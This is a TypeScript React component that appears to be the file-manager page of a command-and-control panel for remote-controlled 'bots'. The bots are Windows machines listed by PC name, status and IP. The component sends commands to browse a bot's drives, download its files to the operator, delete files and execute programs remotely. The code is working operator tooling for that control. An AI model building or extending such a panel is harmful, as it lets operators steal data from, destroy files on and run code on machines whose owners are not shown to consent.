import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { socket } from '../../socket';
import { API_BASE_URL } from '../../config';
import { useLanguage } from '../../i18n/LanguageContext';
import './FileManager.css';

interface Bot {
  id: number;
  pc_name: string;
  status: 'online' | 'offline';
  ip: string;
}

interface FileEntry {
  name: string;
  isDir: boolean;
  size: number;
  modified: string;
  path: string;
}

interface FileManagerProps {
  bots: Bot[];
  userId: number;
}

function formatBytes(bytes: number): string {
  if (bytes === 0) return '—';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

export const FileManager: React.FC<FileManagerProps> = ({ bots, userId }) => {
  const { t } = useLanguage();
  const [selectedBot, setSelectedBot] = useState<Bot | null>(null);
  const [currentPath, setCurrentPath] = useState<string>('');
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Download pending state: path → downloadUrl
  const [downloadPending, setDownloadPending] = useState<Record<string, boolean>>({});

  // Toast
  const [toast, setToast] = useState<{ msg: string; type: 'success' | 'error' } | null>(null);

  // Delete confirm modal
  const [deleteTarget, setDeleteTarget] = useState<FileEntry | null>(null);
  // Exec confirm modal
  const [execTarget, setExecTarget] = useState<FileEntry | null>(null);

  const showToast = (msg: string, type: 'success' | 'error' = 'success') => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 3000);
  };

  // Socket listeners
  useEffect(() => {
    const handleListReady = (data: any) => {
      if (selectedBot && data.pcName?.toLowerCase().trim() === selectedBot.pc_name?.toLowerCase().trim()) {
        setLoading(false);
        if (data.success) {
          setFiles(data.files || []);
          setCurrentPath(data.path || '');
          setError(null);
        } else {
          setError(data.error || t('filemanager.error_list'));
          setFiles([]);
        }
      }
    };

    const handleDownloadReady = (data: any) => {
      if (selectedBot && data.pcName?.toLowerCase().trim() === selectedBot.pc_name?.toLowerCase().trim()) {
        setDownloadPending(prev => {
          const next = { ...prev };
          delete next[data.path];
          return next;
        });
        if (data.success && data.downloadUrl) {
          // Trigger browser download
          const token = localStorage.getItem('token');
          const link = document.createElement('a');
          link.href = `${API_BASE_URL}${data.downloadUrl}`;
          link.setAttribute('download', data.fileName || 'file');
          // Need auth header — fetch as blob
          fetch(`${API_BASE_URL}${data.downloadUrl}`, {
            headers: { Authorization: `Bearer ${token}` }
          })
            .then(r => r.blob())
            .then(blob => {
              const url = URL.createObjectURL(blob);
              const a = document.createElement('a');
              a.href = url;
              a.download = data.fileName || 'file';
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
            });
          showToast(t('filemanager.download_success'), 'success');
        } else {
          showToast(data.error || t('filemanager.download_error'), 'error');
        }
      }
    };

    const handleOpResult = (data: any) => {
      if (selectedBot && data.pcName?.toLowerCase().trim() === selectedBot.pc_name?.toLowerCase().trim()) {
        if (data.op === 'delete') {
          if (data.success) {
            showToast(t('filemanager.delete_success'), 'success');
            // Refresh list
            sendCommand('file_list', currentPath);
          } else {
            showToast(data.error || t('filemanager.delete_error'), 'error');
          }
        } else if (data.op === 'exec') {
          if (data.success) {
            showToast(t('filemanager.exec_success'), 'success');
          } else {
            showToast(data.error || t('filemanager.exec_error'), 'error');
          }
        }
      }
    };

    socket.on(`file_list_ready_${userId}`, handleListReady);
    socket.on(`file_download_ready_${userId}`, handleDownloadReady);
    socket.on(`file_op_result_${userId}`, handleOpResult);

    return () => {
      socket.off(`file_list_ready_${userId}`, handleListReady);
      socket.off(`file_download_ready_${userId}`, handleDownloadReady);
      socket.off(`file_op_result_${userId}`, handleOpResult);
    };
  }, [userId, selectedBot, currentPath, t]);

  const sendCommand = useCallback(async (type: string, filePath: string) => {
    if (!selectedBot) return;
    try {
      const token = localStorage.getItem('token');
      await axios.post(
        `${API_BASE_URL}/api/bots/file/command`,
        { pcName: selectedBot.pc_name, type, path: filePath },
        { headers: { Authorization: `Bearer ${token}` } }
      );
    } catch (e) {
      showToast(t('filemanager.command_error'), 'error');
    }
  }, [selectedBot, t]);

  const handleBotSelect = (bot: Bot) => {
    setSelectedBot(bot);
    setFiles([]);
    setCurrentPath('');
    setError(null);
    // Request root listing
    setTimeout(async () => {
      setLoading(true);
      try {
        const token = localStorage.getItem('token');
        await axios.post(
          `${API_BASE_URL}/api/bots/file/command`,
          { pcName: bot.pc_name, type: 'file_list', path: '' },
          { headers: { Authorization: `Bearer ${token}` } }
        );
      } catch {
        setLoading(false);
        showToast(t('filemanager.command_error'), 'error');
      }
    }, 0);
  };

  const handleNavigate = (entry: FileEntry) => {
    if (!entry.isDir) return;
    setLoading(true);
    setFiles([]);
    sendCommand('file_list', entry.path);
  };

  const handleGoUp = () => {
    if (!currentPath) return;
    // Windows: split by backslash
    const normalized = currentPath.replace(/\\/g, '/');
    const parts = normalized.split('/').filter(Boolean);
    if (parts.length <= 1) {
      // Go to drive root list (empty = user home)
      setLoading(true);
      setFiles([]);
      sendCommand('file_list', '');
    } else {
      parts.pop();
      const parent = parts.join('\\');
      setLoading(true);
      setFiles([]);
      sendCommand('file_list', parent || '');
    }
  };

  const handleRefresh = () => {
    setLoading(true);
    sendCommand('file_list', currentPath);
  };

  const handleDownload = (entry: FileEntry) => {
    setDownloadPending(prev => ({ ...prev, [entry.path]: true }));
    sendCommand('file_download', entry.path);
  };

  const handleDeleteConfirm = () => {
    if (!deleteTarget) return;
    sendCommand('file_delete', deleteTarget.path);
    setDeleteTarget(null);
  };

  const handleExecConfirm = () => {
    if (!execTarget) return;
    sendCommand('file_exec', execTarget.path);
    setExecTarget(null);
  };

  // Breadcrumb
  const buildBreadcrumb = (): { label: string; path: string }[] => {
    if (!currentPath) return [];
    const parts = currentPath.replace(/\\/g, '/').split('/').filter(Boolean);
    const crumbs: { label: string; path: string }[] = [];
    let acc = '';
    for (let i = 0; i < parts.length; i++) {
      if (i === 0 && parts[i].endsWith(':')) {
        acc = parts[i] + '\\';
      } else {
        acc = acc ? acc + (acc.endsWith('\\') ? '' : '\\') + parts[i] : parts[i];
      }
      crumbs.push({ label: parts[i], path: acc });
    }
    return crumbs;
  };

  const breadcrumb = buildBreadcrumb();

  return (
    <div className="fm-container">
      {/* Toast */}
      {toast && (
        <div className={`fm-toast ${toast.type}`}>{toast.msg}</div>
      )}

      <div className="fm-header">
        <h2 className="fm-title">{t('filemanager.title')}</h2>
      </div>

      {/* Bot Seçici */}
      <div className="fm-bot-selector">
        <span className="fm-label">{t('filemanager.select_bot')}</span>
        <div className="fm-bot-list">
          {bots.length === 0 && (
            <span className="fm-no-bots">{t('bots.no_bots')}</span>
          )}
          {bots.map(bot => (
            <button
              key={bot.id}
              className={`fm-bot-btn ${selectedBot?.id === bot.id ? 'active' : ''} ${bot.status === 'online' ? 'online' : 'offline'}`}
              onClick={() => handleBotSelect(bot)}
            >
              <span className={`fm-bot-dot ${bot.status}`} />
              {bot.pc_name}
            </button>
          ))}
        </div>
      </div>

      {/* Toolbar: Breadcrumb + Butonlar */}
      {selectedBot && (
        <div className="fm-toolbar">
          <div className="fm-breadcrumb">
            <span
              className="fm-crumb fm-crumb-root"
              onClick={() => { setLoading(true); setFiles([]); sendCommand('file_list', ''); }}
            >
              {t('filemanager.root')}
            </span>
            {breadcrumb.map((crumb, i) => (
              <React.Fragment key={i}>
                <span className="fm-crumb-sep">\</span>
                <span
                  className={`fm-crumb ${i === breadcrumb.length - 1 ? 'active' : ''}`}
                  onClick={() => {
                    if (i < breadcrumb.length - 1) {
                      setLoading(true);
                      setFiles([]);
                      sendCommand('file_list', crumb.path);
                    }
                  }}
                >
                  {crumb.label}
                </span>
              </React.Fragment>
            ))}
          </div>
          <div className="fm-toolbar-actions">
            <button className="fm-action-btn" onClick={handleGoUp} title={t('filemanager.go_up')}>↑</button>
            <button className="fm-action-btn" onClick={handleRefresh} title={t('filemanager.refresh')}>⟳</button>
          </div>
        </div>
      )}

      {/* Dosya Tablosu */}
      {selectedBot && (
        <div className="fm-table-wrap">
          {loading && (
            <div className="fm-loading">
              <div className="fm-spinner" />
              <span>{t('filemanager.loading')}</span>
            </div>
          )}
          {!loading && error && (
            <div className="fm-error">{error}</div>
          )}
          {!loading && !error && files.length === 0 && (
            <div className="fm-empty">{t('filemanager.no_data')}</div>
          )}
          {!loading && !error && files.length > 0 && (
            <table className="fm-table">
              <thead>
                <tr>
                  <th>{t('filemanager.name')}</th>
                  <th>{t('filemanager.size')}</th>
                  <th>{t('filemanager.modified')}</th>
                  <th>{t('filemanager.actions')}</th>
                </tr>
              </thead>
              <tbody>
                {files.map((entry, i) => (
                  <tr key={i} className={entry.isDir ? 'fm-row-dir' : 'fm-row-file'}>
                    <td>
                      <div
                        className={`fm-name ${entry.isDir ? 'dir' : 'file'}`}
                        onClick={() => entry.isDir && handleNavigate(entry)}
                        title={entry.path}
                      >
                        <span className="fm-icon">{entry.isDir ? '📁' : '📄'}</span>
                        <span>{entry.name}</span>
                      </div>
                    </td>
                    <td className="fm-size">{entry.isDir ? '—' : formatBytes(entry.size)}</td>
                    <td className="fm-modified">{entry.modified}</td>
                    <td>
                      <div className="fm-actions">
                        {!entry.isDir && (
                          <button
                            className="fm-btn fm-btn-download"
                            onClick={() => handleDownload(entry)}
                            disabled={!!downloadPending[entry.path]}
                            title={t('filemanager.download')}
                          >
                            {downloadPending[entry.path] ? '...' : t('filemanager.download')}
                          </button>
                        )}
                        {!entry.isDir && (
                          <button
                            className="fm-btn fm-btn-exec"
                            onClick={() => setExecTarget(entry)}
                            title={t('filemanager.execute')}
                          >
                            {t('filemanager.execute')}
                          </button>
                        )}
                        <button
                          className="fm-btn fm-btn-delete"
                          onClick={() => setDeleteTarget(entry)}
                          title={t('filemanager.delete')}
                        >
                          {t('filemanager.delete')}
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      )}

      {!selectedBot && (
        <div className="fm-no-selection">
          <span>📂</span>
          <p>{t('filemanager.select_bot_hint')}</p>
        </div>
      )}

      {/* Delete Confirm Modal */}
      {deleteTarget && (
        <div className="modal-overlay" onClick={() => setDeleteTarget(null)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h3 className="modal-title">{t('filemanager.delete_title')}</h3>
            <p className="modal-desc">
              {t('filemanager.delete_confirm')}
              <br />
              <span style={{ color: '#ff4444', wordBreak: 'break-all' }}>{deleteTarget.path}</span>
            </p>
            <div className="modal-actions">
              <button className="btn-cancel" onClick={() => setDeleteTarget(null)}>{t('common.cancel')}</button>
              <button className="btn-danger" onClick={handleDeleteConfirm}>{t('filemanager.delete')}</button>
            </div>
          </div>
        </div>
      )}

      {/* Exec Confirm Modal */}
      {execTarget && (
        <div className="modal-overlay" onClick={() => setExecTarget(null)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h3 className="modal-title">{t('filemanager.exec_title')}</h3>
            <p className="modal-desc">
              {t('filemanager.exec_confirm')}
              <br />
              <span style={{ color: '#ffaa00', wordBreak: 'break-all' }}>{execTarget.path}</span>
            </p>
            <div className="modal-actions">
              <button className="btn-cancel" onClick={() => setExecTarget(null)}>{t('common.cancel')}</button>
              <button className="btn-exec" onClick={handleExecConfirm}>{t('filemanager.execute')}</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
